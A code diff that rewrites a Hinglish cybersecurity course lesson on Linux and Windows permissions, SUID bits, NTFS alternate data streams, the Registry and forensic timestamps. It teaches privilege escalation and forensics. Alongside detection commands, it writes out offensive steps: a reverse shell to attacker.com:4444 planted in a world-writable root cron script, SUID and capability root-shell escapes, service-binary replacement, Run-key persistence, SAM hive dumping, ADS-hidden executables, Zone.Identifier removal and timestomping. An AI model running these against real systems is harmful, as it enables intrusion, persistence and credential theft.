@@ -1351,33 +1351,556 @@ Get-Process chrome | ForEach {$_.Modules | Select ModuleName, BaseAddress, Modul
   },
 
   "cb-04": {
-    title: "File Systems & Storage",
+    title: "File Systems, Permissions & Registry",
     image: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=900&fit=crop&auto=format",
-    tagline: "Data kahan jaata hai? HDD, SSD, Cloud — sab samjho!",
+    tagline: "chmod, icacls, SUID, NTFS ADS, Registry — permissions samajhna hacking ka base hai",
     sections: [
       {
-        heading: "📁 File System Kya Hota Hai?",
-        content: `Imagine karo ek library — lakh books hain lekin koi system nahi, koi alag shelf nahi, sab floor pe bikhri hain. Kuch dhundh paoge? File system exactly yahi kaam karta hai — data ko organized rakha jaata hai.\n\n**File System ke kaam:**\n• Files ko name, size, date ke saath store karna\n• Folders (directories) banana\n• Yeh track karna ki data disk ke kahan pe hai\n• Read/write permissions manage karna\n\n**Popular File Systems:**\n• **NTFS** — Windows ka default. Large files support karta hai, permissions bhi.\n• **FAT32** — Purana, USB drives mein common. 4GB se bada file support nahi karta.\n• **exFAT** — FAT32 ka updated version, Windows/Mac dono pe kaam karta hai.\n• **ext4** — Linux ka main file system.\n• **APFS** — Apple File System, macOS ke liye.`,
+        heading: "🐧 Linux File Permissions — rwx Numbers Samjho",
+        content: `Linux permissions ek 9-character string hoti hai — yeh samajhna privilege escalation ke liye foundational hai.
+
+**Permission String Decode Karna:**
+\`\`\`bash
+ls -la /etc/passwd
+# Output: -rw-r--r-- 1 root root 2847 Jan 10 12:00 /etc/passwd
+#          ↑↑↑↑↑↑↑↑↑
+#          │││││││││
+#          ││││││└└└── Other permissions (r--)
+#          │││└└└───── Group permissions (r--)
+#          └└└──────── Owner permissions (rw-)
+#          │
+#          └─────────── File type (- = file, d = directory, l = symlink)
+
+# r = read    = 4
+# w = write   = 2  
+# x = execute = 1
+# - = no permission = 0
+\`\`\`
+
+**Numeric (Octal) Permissions — Quick Reference:**
+
+| Octal | Binary | Permissions | Matlab |
+|-------|--------|------------|--------|
+| 7 | 111 | rwx | Sab kuch |
+| 6 | 110 | rw- | Read + Write |
+| 5 | 101 | r-x | Read + Execute |
+| 4 | 100 | r-- | Sirf Read |
+| 0 | 000 | --- | Kuch Nahi |
+
+**chmod Commands — Practice Karo:**
+\`\`\`bash
+# Numeric style (recommended):
+chmod 755 script.sh   # Owner: rwx, Group: r-x, Other: r-x
+chmod 644 data.txt    # Owner: rw-, Group: r--, Other: r--
+chmod 700 secret.sh   # Owner: rwx, Group: ---, Other: ---
+chmod 600 id_rsa      # SSH private key — only owner can read!
+chmod 777 danger.sh   # EVERYONE can read/write/execute — DANGEROUS!
+
+# Symbolic style:
+chmod u+x script.sh   # User ko execute add karo
+chmod go-w file.txt   # Group aur Others se write hata do
+chmod a+r readme.txt  # All (user+group+other) ko read do
+
+# Recursive (directory + contents):
+chmod -R 755 /var/www/html   # Web server files
+\`\`\`
+
+**Security-Critical Permissions:**
+\`\`\`bash
+# World-writable files dhundho (dangerous!):
+find / -perm -o+w -type f 2>/dev/null | grep -v /proc | grep -v /sys
+
+# World-writable directories:
+find / -perm -o+w -type d 2>/dev/null
+
+# Files jo sirf root ke hone chahiye lekin nahi:
+find /etc -not -user root -type f 2>/dev/null
+
+# Unowned files (orphaned — suspicious):
+find / -nouser -o -nogroup 2>/dev/null | head -20
+\`\`\`
+
+**Real Scenario — Permission Escalation:**
+\`\`\`bash
+# Ek misconfigured cron job:
+cat /etc/cron.d/backup
+# */5 * * * * root /opt/backup/run_backup.sh
+
+ls -la /opt/backup/run_backup.sh
+# -rwxrwxrwx 1 root root 45 Jan 10 /opt/backup/run_backup.sh
+#       ↑
+# World-writable! Anyone can modify!
+
+echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /opt/backup/run_backup.sh
+# 5 minutes mein: root shell on attacker's machine!
+\`\`\``,
       },
       {
-        heading: "💾 Storage Types — HDD vs SSD vs Cloud",
-        content: `**HDD (Hard Disk Drive):**\n• Spinning magnetic disk hoti hai andar\n• Mechanical parts hone ki wajah se slow aur fragile\n• Zyada storage, kam price (1TB = ~2000 Rs)\n• Drop karo — data ja sakta hai\n\n**SSD (Solid State Drive):**\n• Flash memory chips — koi moving part nahi\n• HDD se 5-10x fast\n• Zyada mehenga (1TB = ~7000-10000 Rs)\n• Laptop drop karo — data safe rehta hai\n\n**NVMe SSD:**\n• SSD se bhi fast — directly PCIe slot mein lagate hain\n• Gaming aur heavy workloads ke liye best\n\n**Cloud Storage:**\n• Google Drive, OneDrive, iCloud, AWS S3\n• Internet ke through kisi bhi device se access\n• Kisi aur ke server pe data hai — security concern!\n• Backup ke liye bahut accha`,
+        heading: "👑 SUID, SGID, Sticky Bit — Special Permissions",
+        content: `Linux mein normal rwx ke alawa 3 special permission bits hote hain. Inhe samajhna privilege escalation ke liye critical hai — OSCP aur CTF mein roz kaam aata hai.
+
+**SUID (Set User ID) — Agar Root Ka Ho, Toh Root Ban Jao:**
+\`\`\`bash
+# SUID bit kaise dikhta hai:
+ls -la /usr/bin/passwd
+# -rwsr-xr-x 1 root root 54256 /usr/bin/passwd
+#     ↑
+#     's' yahan hai (x ki jagah) = SUID set hai
+
+# Matlab: anyone is file ko execute kare, 
+# program FILE KE OWNER (root) ki permissions se chalega
+# Normal user bhi passwd run karke apna password change kar sakta hai
+# (sirf apna wala field — internally checked)
+
+# SUID binaries dhundho (privilege escalation ka pehla check):
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+\`\`\`
+
+**GTFOBins — SUID Se Root Shell:**
+\`\`\`bash
+# find command SUID hai toh:
+find . -exec /bin/sh \; -quit
+# Result: root shell!
+
+# vim SUID hai toh:
+vim -c ':!/bin/sh'
+
+# python SUID hai toh:
+python -c 'import os; os.system("/bin/sh")'
+
+# nmap SUID hai toh (old versions):
+echo "os.execute('/bin/sh')" > /tmp/shell.nse
+nmap --script=/tmp/shell.nse
+
+# GTFOBins.github.io pe 200+ such binaries listed hain
+\`\`\`
+
+**SGID (Set Group ID):**
+\`\`\`bash
+# Directory pe SGID:
+ls -ld /var/log/shared/
+# drwxrws--- 2 root syslog 4096 /var/log/shared/
+#       ↑
+#       's' group execute ke jagah = SGID
+
+# Matlab: is directory mein create hone wali files
+# automatically directory ka group inherit karengi
+# Shared workspace directories mein use hota hai
+
+# SGID files/dirs dhundho:
+find / -perm -2000 -type f 2>/dev/null
+\`\`\`
+
+**Sticky Bit — Public Directory Protection:**
+\`\`\`bash
+ls -ld /tmp
+# drwxrwxrwt 12 root root 4096 /tmp
+#          ↑
+#          't' = Sticky bit set
+
+# /tmp world-writable hai — sab likh sakte hain
+# Sticky bit ke bina: koi bhi doosre ki files delete kar sakta
+# Sticky bit ke saath: sirf FILE OWNER apni file delete kar sakta hai
+
+# Set karna:
+chmod +t /shared/directory
+chmod 1777 /shared/directory  # 1 = sticky bit
+
+# Security check:
+find / -perm -1000 -type d 2>/dev/null  # Sticky bit directories
+\`\`\`
+
+**Capabilities — SUID Ka Modern Alternative:**
+\`\`\`bash
+# Capabilities specific privileges granularly assign karti hain
+# ping command ko root nahi chahiye, sirf raw sockets:
+getcap /usr/bin/ping
+# /usr/bin/ping = cap_net_raw+ep
+
+# Interesting capabilities dhundho:
+getcap -r / 2>/dev/null
+# cap_setuid+ep = uid change kar sakte hain = root!
+# cap_net_admin = network config = possible MITM
+
+# Example escalation with cap_setuid:
+python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+# Agar python3 mein cap_setuid capability hai → root!
+\`\`\``,
       },
       {
-        heading: "🗂️ File Structure — Folders Ka System",
-        content: `Har OS mein ek root se sab kuch start hota hai:\n\n**Windows structure:**\n\`\`\`\nC:\\\n├── Windows\\ (OS files)\n├── Program Files\\ (installed apps)\n├── Users\\\n│   └── YourName\\\n│       ├── Documents\\\n│       ├── Downloads\\\n│       └── Desktop\\\n\`\`\`\n\n**Linux structure:**\n\`\`\`\n/\n├── etc/ (configuration files)\n├── var/log/ (log files — important!)\n├── home/username/ (user files)\n├── tmp/ (temporary files)\n├── bin/ (executable programs)\n└── root/ (root user home)\n\`\`\`\n\nCybersecurity ke liye Linux structure jaanna bahut zaroori hai — jab logs check karte ho ya files dhundh rahe ho.`,
+        heading: "🪟 Windows Permissions — icacls aur ACL",
+        content: `Windows mein Linux se alag permission system hai — ACL (Access Control List) based. NTFS permissions zyada granular hoti hain.
+
+**NTFS Permission Types:**
+| Permission | Matlab | Includes |
+|-----------|--------|---------|
+| Full Control | Sab kuch | Read + Write + Execute + Delete + Change Permissions |
+| Modify | Changes karo | Read + Write + Execute + Delete |
+| Read & Execute | Run karo | Read + Execute |
+| Read | Sirf dekho | Read Only |
+| Write | Likhna | Write + Append |
+| Special Permissions | Custom combination | Granular control |
+
+**icacls Command — Windows Permission Tool:**
+\`\`\`cmd
+:: File permissions dekho:
+icacls C:\Users\Public\document.txt
+:: Output:
+:: C:\Users\Public\document.txt
+::   BUILTIN\Administrators:(F)        ← Full Control
+::   NT AUTHORITY\SYSTEM:(F)           ← Full Control
+::   BUILTIN\Users:(RX)                ← Read & Execute
+::   NT AUTHORITY\Authenticated Users:(M)  ← Modify
+
+:: Permission grant karo:
+icacls file.txt /grant "Domain\John:(RX)"
+
+:: Permission remove karo:
+icacls file.txt /remove "Domain\John"
+
+:: Recursive karo:
+icacls C:\WebApp\ /grant "IIS_IUSRS:(RX)" /T
+
+:: Weak permissions dhundho (pentest check):
+:: Everyone ya Users group ko Write/Modify milna = dangerous
+Get-ChildItem "C:\Program Files" -Recurse | 
+  Get-Acl | 
+  ForEach-Object { 
+    $_.Access | Where-Object {$_.IdentityReference -match "Everyone|Users" -and 
+                               $_.FileSystemRights -match "Write|FullControl"}
+  }
+\`\`\`
+
+**Pentest Scenario — Weak Service Permissions:**
+\`\`\`powershell
+# Service executable ka path dhundho:
+sc qc VulnerableService
+# BINARY_PATH_NAME: C:\Program Files\VulnApp\app.exe
+
+# Permissions check karo:
+icacls "C:\Program Files\VulnApp\app.exe"
+# VulnApp\app.exe
+#   BUILTIN\Users:(F)  ← EVERYONE can modify!
+
+# Attack:
+# 1. Original replace karo apne reverse shell se:
+copy C:\tmp\evil.exe "C:\Program Files\VulnApp\app.exe"
+# 2. Service restart karo (agar stop/start rights hain):
+sc stop VulnerableService
+sc start VulnerableService
+# 3. Service SYSTEM pe chala → SYSTEM shell mila!
+\`\`\`
+
+**Linux /etc/passwd aur /etc/shadow:**
+\`\`\`bash
+# /etc/passwd — world-readable (intentionally):
+cat /etc/passwd | head -3
+# root:x:0:0:root:/root:/bin/bash
+# ↑    ↑ ↑ ↑ ↑    ↑     ↑
+# user pass uid gid comment home shell
+# 'x' = password /etc/shadow mein hai
+
+# /etc/shadow — only root can read (mode 640):
+sudo cat /etc/shadow | head -3
+# root:$6$salt$hash...:18000:0:99999:7:::
+#      ↑
+#      $6$ = SHA-512, $1$ = MD5 (weak), $2b$ = bcrypt (strong)
+
+# Security check:
+ls -la /etc/shadow   # Should be -rw-r----- root shadow
+# Agar world-readable hain → critical vulnerability!
+cat /etc/shadow 2>/dev/null && echo "READABLE - CRITICAL ISSUE!"
+
+# Hash identification:
+# $1$ = MD5 (very weak — crack in seconds)
+# $5$ = SHA-256 (weak)
+# $6$ = SHA-512 (better)
+# $2b$ = bcrypt (good — slow by design)
+# $y$ = yescrypt (best — modern)
+\`\`\``,
       },
       {
-        heading: "🔍 Forensics Angle — Deleted Files",
-        content: `Yahan interesting baat hai — jab tum file "delete" karte ho, woh permanently nahi jaati!\n\nFile delete karne pe:\n1. OS sirf ek "pointer" remove karta hai\n2. Actual data disk pe wahan hi rehta hai\n3. Jab tak naya data uski jagah nahi likhta, file recover ho sakti hai\n\n**File Recovery Tools:**\n• Recuva (Windows)\n• TestDisk / PhotoRec (Linux)\n• Autopsy (professional forensics tool)\n\n**Secure Delete karne ke liye:**\n• Windows: cipher /w command\n• Linux: shred command\n• Physical: HDD ko degauss karo ya physically destroy karo\n\n**Cybersecurity lesson:** Criminals yahi galti karte hain — files delete karke sochte hain sab chala gaya, lekin forensic investigators recover kar lete hain. Isliye digital forensics field mein yeh concept fundamental hai!`,
+        heading: "🪞 NTFS Alternate Data Streams — Data Chhupana",
+        content: `NTFS (Windows file system) mein ek feature hai jise "Alternate Data Streams" kehte hain — yeh data hide karne ka ek clever technique hai. Malware authors aur CTF creators dono iska use karte hain.
+
+**ADS Kya Hai — Concept:**
+\`\`\`
+Normal file structure:
+  document.txt → [Main data stream] → "This is normal text"
+
+NTFS ADS structure:
+  document.txt → [Main data stream] → "This is normal text"
+               → [:hidden] → [Kuch aur data — secret!]
+               → [:malware.exe] → [Executable code!]
+
+dir command mein:  document.txt    5 bytes  ← Sirf main stream size dikhti hai
+Hidden stream:     koi sign nahi    ← Invisible!
+\`\`\`
+
+**ADS Create aur Access — Hands On:**
+\`\`\`cmd
+:: Normal file banao:
+echo "This is a normal text file" > visible.txt
+
+:: Hidden stream mein data chhupao:
+echo "Secret hidden data here!" > visible.txt:secret.txt
+
+:: Main stream padhna (normal):
+type visible.txt
+:: Output: "This is a normal text file" ← Normal dikhta hai
+
+:: Hidden stream padhna:
+more < visible.txt:secret.txt
+:: Output: "Secret hidden data here!"
+
+:: Dir mein nahi dikhega (without /r):
+dir visible.txt
+:: Sirf 27 bytes dikhega (main stream)
+
+:: ADS dikhao:
+dir /r visible.txt
+:: visible.txt          27
+::   visible.txt:secret.txt:$DATA    24  ← ADS dikha!
+
+:: Executable ADS:
+type malware.exe > legitimate.txt:evil.exe
+
+:: ADS execute karna:
+wscript C:\path\to\legitimate.txt:evil.exe
+
+:: PowerShell se ADS:
+Get-Item visible.txt -Stream *     :: Sab streams dekho
+Set-Content visible.txt -Stream hidden -Value "Secret!"
+Get-Content visible.txt -Stream hidden
+\`\`\`
+
+**Zone.Identifier — Ek Common ADS:**
+\`\`\`cmd
+:: Internet se download ki gayi files mein automatically:
+more < downloaded_file.exe:Zone.Identifier
+:: [ZoneTransfer]
+:: ZoneId=3    ← 3 = Internet zone (risky)
+:: ReferrerUrl=https://some-website.com/
+
+:: ZoneId values:
+:: 0 = Local computer
+:: 1 = Local Intranet
+:: 2 = Trusted sites
+:: 3 = Internet
+:: 4 = Restricted sites
+
+:: "Run anyway" click karne pe Windows yeh prompt isliye dikhata hai
+:: Malware yeh ADS remove/modify karta hai to avoid SmartScreen:
+Remove-Item C:\path\malware.exe -Stream Zone.Identifier
+\`\`\`
+
+**Forensics — ADS Detect Karna:**
+\`\`\`cmd
+:: Streams.exe (Sysinternals) — ADS detector:
+streams.exe -s C:\Windows\System32\
+
+:: PowerShell — drive-wide ADS scan:
+Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | 
+  ForEach-Object { Get-Item $_.FullName -Stream * } | 
+  Where-Object {$_.Stream -ne ':$Data'} |
+  Select PSChildName, Stream, Length
+
+:: Malware aur data hiding pe kya dhundhen:
+:: - Executable content (.exe, shellcode bytes) in non-exe file ADS
+:: - Large ADS (>1KB) on system files
+:: - ADS on files in %TEMP%, %APPDATA%, Downloads
+\`\`\`
+
+**Real Malware Example:**
+Poweliks trojan (2014) — NTFS registry ADS use karta tha (fileless malware):
+- Koi disk pe file nahi
+- Malicious VBScript Windows Registry mein ek ADS mein store
+- Har boot pe execute
+- Traditional antivirus detect nahi kar sakta tha (koi file nahi)`,
+      },
+      {
+        heading: "🗝️ Windows Registry — OS Ka Central Database",
+        content: `Windows Registry ek hierarchical database hai jisme OS aur applications ki sari configuration store hoti hai. Yeh attackers ke liye ek goldmine hai — persistence, credentials, system info — sab yahan milta hai.
+
+**Registry Structure — 5 Root Keys:**
+\`\`\`
+HKEY_LOCAL_MACHINE (HKLM)
+  → Machine-wide settings
+  → Admin rights chahiye modify karne ke liye
+  → HKLM\SOFTWARE, HKLM\SYSTEM, HKLM\SECURITY
+
+HKEY_CURRENT_USER (HKCU)
+  → Current user ki settings
+  → Koi bhi user khud ka HKCU modify kar sakta hai (no admin needed)
+  → HKCU\Software, HKCU\Environment
+
+HKEY_USERS (HKU)
+  → Sab users ki profiles
+  → HKCU is ka shortcut hai currently logged user ke liye
+
+HKEY_CLASSES_ROOT (HKCR)
+  → File associations, COM objects
+  → Merge of HKLM\SOFTWARE\Classes aur HKCU\Software\Classes
+
+HKEY_CURRENT_CONFIG (HKCC)
+  → Current hardware profile
+  → Runtime info
+\`\`\`
+
+**Persistence — Malware Ki Favourite Keys:**
+\`\`\`cmd
+:: Har user login pe auto-start (no admin needed — HKCU):
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\malware.exe"
+
+:: All users ke liye (admin needed — HKLM):
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\malware.exe"
+
+:: Check karo kya chal raha hai startup pe:
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+
+:: Sysinternals Autoruns tool — sab persistence locations ek saath:
+:: Har tab ek alag persistence method dikhata hai
+\`\`\`
+
+**Critical Registry Locations — Pentest/Forensics:**
+\`\`\`cmd
+:: Stored WiFi passwords:
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
+
+:: Recently accessed files (RecentDocs):
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
+
+:: Installed software:
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s
+
+:: Windows Defender disabled check:
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
+:: 0x1 = Disabled (suspicious!)
+
+:: SAM database (local user hashes — needs SYSTEM):
+reg save HKLM\SAM C:\temp\sam.hive
+reg save HKLM\SYSTEM C:\temp\system.hive
+:: Impacket secretsdump se hashes extract karo
+
+:: AppCompatCache (shimcache) — program execution history:
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
+:: Malware ka naam aur execution time milta hai
+\`\`\`
+
+**PowerShell — Registry Se Information Gather:**
+\`\`\`powershell
+# Sab Run keys check karo:
+$runKeys = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+)
+foreach ($key in $runKeys) {
+    Write-Host "=== $key ===" -ForegroundColor Yellow
+    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | 
+        Select-Object * -ExcludeProperty PS*
+}
+
+# Suspicious: entries pointing to %TEMP%, %APPDATA%, unusual paths
+\`\`\``,
+      },
+      {
+        heading: "🕰️ MACE Timestamps — Forensics aur Timestomping",
+        content: `Har file ke saath timestamps hote hain jo bataate hain kab file create/modify/access hui. Attackers inhe manipulate karte hain (timestomping) — aur forensics experts inhe cross-reference karke detect karte hain.
+
+**MACE Timestamps — Kya Matlab:**
+\`\`\`
+M = Modified   → File ka content last kab badla (write)
+A = Accessed   → File last kab open/read hui
+C = Changed    → Metadata last kab badla (permissions, owner, rename)
+E = Entry Modified → MFT (Master File Table) entry last kab badli
+
+Windows Explorer mein: Created, Modified, Accessed
+Linux: ctime (change), mtime (modify), atime (access)
+\`\`\`
+
+**Linux Timestamps — stat Command:**
+\`\`\`bash
+stat /etc/passwd
+# File: /etc/passwd
+# Size: 2847         Blocks: 8          IO Block: 4096   regular file
+# Access: 2024-01-10 09:15:23.000000000
+# Modify: 2024-01-05 14:32:11.000000000    ← mtime (content changed)
+# Change: 2024-01-05 14:32:11.000000000    ← ctime (metadata changed)
+# Birth:  2023-09-01 00:00:00.000000000    ← creation time (not always available)
+
+# Find files modified in last 24 hours:
+find / -mtime -1 2>/dev/null | grep -v /proc
+
+# Find files accessed today (attackers leave atime traces):
+find /home -atime -1 2>/dev/null
+
+# Compare timestamps (suspicious gap?):
+ls -la --full-time /suspicious_file
+\`\`\`
+
+**Windows Timestomping — Attack aur Detection:**
+\`\`\`powershell
+# Timestomping with PowerShell:
+$file = Get-Item "C:\malware.exe"
+$file.CreationTime = "2019-01-01 12:00:00"
+$file.LastWriteTime = "2019-01-01 12:00:00"
+$file.LastAccessTime = "2019-01-01 12:00:00"
+# Windows Explorer mein 2019 ki date dikhegi — old system file lag raha hai!
+
+# Metasploit timestomp module:
+# meterpreter > timestomp C:\malware.exe -z "01/01/2019 12:00:00"
+
+# Detection — NTFS mein 2 sets of timestamps hain!
+# $STANDARD_INFORMATION attribute → attacker easily modify karta hai
+# $FILE_NAME attribute → harder to modify (requires kernel access)
+
+# Mismatch = timestomping!
+# Forensic tools (Volatility, Autopsy, X-Ways) dono compare karte hain
+\`\`\`
+
+**Forensics Timeline — Practical Example:**
+\`\`\`
+Incident investigation timeline:
+14:32 → Employee gets phishing email (email server logs)
+14:35 → attachment.docm opened (HKCU RecentDocs registry, prefetch file)
+14:35 → Word macro runs (Windows Event ID 4688 — new process: cmd.exe parent: winword.exe)
+14:36 → malware.exe dropped in C:\Users\AppData\Roaming\ (filesystem mtime)
+14:36 → malware.exe added to Run key (Registry modification event)
+14:37 → Outbound connection to 192.168.1.1:4444 (firewall logs, NetFlow)
+14:38 → Suspicious PowerShell activity (Event ID 4104 — script block logging)
+
+Timeline banao → attack vector samjho → damage assess karo → respond karo
+\`\`\`
+
+**Important Forensics Commands:**
+\`\`\`bash
+# Linux — last login history:
+last -F                  # login/logout history with timestamps
+lastlog                  # each user's last login
+
+# Windows — file access audit:
+# Event ID 4663 = file accessed (agar SACL set ho)
+# Event ID 4656 = handle opened to object
+
+# Bulk timestamp check (Linux CTF/forensics):
+find /home -newer /tmp/reference_time -type f 2>/dev/null
+# Reference time ek known-clean timestamp wali file hai
+\`\`\``,
       },
     ],
     keyPoints: [
-      "File system = data ko organized rakhne ka system",
-      "NTFS (Windows), ext4 (Linux), APFS (Mac)",
-      "SSD > HDD in speed, HDD > SSD in price/GB",
-      "Delete karna = pointer remove karna, data rehta hai",
-      "Forensics mein deleted files recover ki ja sakti hain",
+      "Linux permissions: rwx = 4+2+1; 755=rwxr-xr-x (normal), 644=rw-r--r-- (data), 600=rw------- (secrets)",
+      "SUID bit: program file owner ki permissions se chalta hai — root-owned SUID = koi bhi user root ban sakta hai",
+      "SUID dhundho: find / -perm -4000 2>/dev/null — GTFOBins.github.io pe exploitation check karo",
+      "NTFS ADS: file:hidden_stream mein data chhupaao — dir /r se detect hota hai, regular dir mein invisible",
+      "Registry Run keys: HKCU/HKLM ...\\CurrentVersion\\Run — malware persistence ka favourite location",
+      "MACE timestamps: Modified/Accessed/Changed/Entry — timestomping se $STANDARD_INFO badlta hai, $FILE_NAME nahi",
+      "icacls: Windows permissions tool — Everyone ya Users ko Write milna = privilege escalation vector",
+      "/etc/shadow: $1$ = MD5 (crack in seconds), $2b$ = bcrypt (slow — good) — readable hona = critical vuln",
     ],
   },
 
